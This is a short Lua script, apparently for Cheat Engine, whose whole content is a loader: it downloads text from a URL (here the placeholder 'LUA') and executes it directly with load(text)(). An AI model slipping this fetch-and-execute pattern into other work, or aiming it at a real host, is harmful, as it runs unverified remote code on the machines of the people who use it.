function ROLEX()
local url = 'LUA'
local int = getInternet()
local text = int.getURL(url)
int.destroy()
load(text)()
end
ROLEX()